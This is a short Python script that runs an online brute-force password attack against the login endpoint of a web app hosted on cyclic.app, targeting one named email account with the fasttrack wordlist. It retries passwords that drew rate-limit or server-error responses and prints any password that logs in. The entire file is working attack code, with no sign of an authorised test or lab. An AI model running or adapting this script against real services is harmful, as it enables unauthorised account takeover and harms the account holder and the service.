import requests
import json

# Define constants
USER = "joaoOliveira@gmail.pt"
WORDLIST_PATH = '/usr/share/wordlists/fasttrack.txt'
URL = "https://shy-lime-bull-tux.cyclic.app/api/v1/user/login"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "application/json, text/plain, /",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "Origin": "http://localhost:3000",
    "Referer": "http://localhost:3000/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site"
}

def brute_force_attack(user, wordlist_path, url, headers):
    # Initialize a list to store the passwords that resulted in a 500 or 429 status code
    passwords_to_store = []

    with open(wordlist_path, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # remove newline characters
        data = {"email": user, "password": password}

        response = requests.post(url, headers=headers, data=json.dumps(data))

        # If the status code is 500 or 429, store the password
        if response.status_code in [500, 429]:
            passwords_to_store.append(password)

        # If the status code is 200, store the password
        elif response.status_code == 200:
            print(f"User: {data['email']}\nPassword: {password}")
            return

    print("Retesting the passwords that resulted in a 500 or 429 status code...")

    for password in passwords_to_store:
        data["password"] = password

        response = requests.post(url, headers=headers, data=json.dumps(data))

        # If the status code is 200 for the retest, store the password
        if response.status_code == 200:
            print(f"User: {data['email']}\nPassword: {password}")
            return

    print("Brute force attack completed.")

# Call the function
brute_force_attack(USER, WORDLIST_PATH, URL, HEADERS)
